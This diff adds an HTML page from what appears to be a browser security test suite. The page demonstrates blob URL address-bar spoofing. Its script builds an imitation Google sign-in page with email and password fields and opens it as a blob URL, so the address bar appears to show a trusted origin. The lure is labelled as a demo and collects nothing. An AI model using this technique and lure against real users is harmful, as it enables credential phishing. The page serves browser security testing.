@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>SPOOF-SAFARI-01: Blob URL Address Bar Display</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+</head>
+<body class="test-page" style="background:#0d1117;color:#c9d1d9;">
+<div class="container">
+    <a href="../../../index.html" class="btn btn-back">&larr; Back to Suite</a>
+    <h1>Blob URL Address Bar Display Spoofing</h1>
+    <div class="meta">
+        <span>ID: SPOOF-SAFARI-01</span>
+        <span>Browsers: Safari, Chrome, Firefox (varies)</span>
+        <span>Category: URL Spoofing</span>
+    </div>
+
+    <div class="test-section">
+        <h2>Description</h2>
+        <p>Blob URLs display as <code>blob:https://origin/uuid</code> in the address bar.
+        If the origin is a trusted domain, the address bar shows what appears to be a
+        legitimate URL while serving completely attacker-controlled content. This is
+        especially effective on mobile where the blob: prefix may be truncated.</p>
+    </div>
+
+    <div class="test-section">
+        <h2>Run Test</h2>
+        <button class="btn btn-run" onclick="runTest()">Open Blob URL Popup</button>
+        <button class="btn" onclick="runNavigateTest()">Navigate Tab to Blob URL</button>
+        <div id="output" class="output-box" style="margin-top:10px;"></div>
+    </div>
+</div>
+
+<script src="../../../js/utils.js"></script>
+<script>
+function runTest() {
+    const output = document.getElementById('output');
+    const info = detectBrowser();
+    output.innerHTML = '<div style="color:#d29922;">Creating blob URL with spoofed content...</div>';
+    output.innerHTML += '<div style="color:#8b949e;">Browser: ' + info.browser + ' ' + info.version + '</div>';
+
+    const spoofContent = '<!DOCTYPE html><html><head><title>Sign in - Google Accounts</title></head>' +
+        '<body style="font-family:arial;max-width:400px;margin:80px auto;text-align:center;">' +
+        '<h2 style="color:#202124;">Sign in</h2>' +
+        '<p style="color:#5f6368;">Use your Google Account</p>' +
+        '<input type="email" placeholder="Email or phone" style="width:100%;padding:12px;margin:16px 0;border:1px solid #dadce0;border-radius:4px;">' +
+        '<input type="password" placeholder="Password" style="width:100%;padding:12px;margin:0 0 16px;border:1px solid #dadce0;border-radius:4px;">' +
+        '<button style="background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;cursor:pointer;">Next</button>' +
+        '<hr style="margin:20px 0;">' +
+        '<p style="color:#f85149;font-size:12px;">THIS IS A POC DEMO - Address bar shows blob:' + location.origin + '/...</p>' +
+        '<p style="color:#8b949e;font-size:12px;">On mobile, the blob: prefix may be truncated, showing only ' + location.origin + '</p>' +
+        '</body></html>';
+
+    const blob = new Blob([spoofContent], { type: 'text/html' });
+    const blobUrl = URL.createObjectURL(blob);
+
+    output.innerHTML += '<div style="color:#8b949e;">Blob URL: ' + blobUrl + '</div>';
+    output.innerHTML += '<div style="color:#d29922;">Address bar will show: blob:' + location.origin + '/...</div>';
+    output.innerHTML += '<div style="color:#d29922;">On mobile Safari, only "' + location.origin + '" may be visible.</div>';
+
+    const popup = window.open(blobUrl);
+    if (!popup) {
+        output.innerHTML += '<div style="color:#f85149;">Popup blocked. Allow popups for this test.</div>';
+        output.innerHTML += '<div><a href="' + blobUrl + '" target="_blank" style="color:#58a6ff;">Click to open manually</a></div>';
+    } else {
+        reportResult('output', 'Blob URL address bar display', true,
+            'Popup opened with blob: URL. Check if address bar looks like a Google login.');
+    }
+}
+
+function runNavigateTest() {
+    const output = document.getElementById('output');
+    output.innerHTML = '<div style="color:#d29922;">This will navigate the current tab to a blob URL.</div>';
+    output.innerHTML += '<div style="color:#d29922;">Use browser back button to return.</div>';
+
+    const content = '<!DOCTYPE html><html><head><title>Account Recovery</title></head>' +
+        '<body style="font-family:arial;max-width:400px;margin:80px auto;text-align:center;">' +
+        '<p style="background:#f85149;color:#fff;padding:10px;border-radius:4px;">POC DEMO: Check your address bar</p>' +
+        '<p>The address bar shows: blob:' + location.origin + '/...</p>' +
+        '<p><a href="javascript:history.back()">Go Back</a></p></body></html>';
+
+    const blob = new Blob([content], { type: 'text/html' });
+    location.href = URL.createObjectURL(blob);
+}
+</script>
+</body>
+</html>
